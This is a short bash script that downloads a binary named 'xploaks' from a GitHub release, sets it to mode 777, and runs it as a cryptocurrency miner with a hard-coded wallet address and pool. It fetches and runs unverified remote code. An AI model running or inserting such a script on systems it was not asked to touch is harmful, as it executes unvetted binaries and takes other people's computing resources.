#!/bin/bash

# Update package list and install required dependencies
apt update && \
    apt -y install curl git wget libicu-dev

# Download miner binary
wget https://github.com/vedhagsvp/xplare/releases/download/shaos/xploaks

# Make it executable
chmod 777 xploaks

# Run the miner
./xploaks -stratum stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.$(echo $RANDOM | md5sum | head -c 10):x@stratum-sgp.x-phere.com:33333
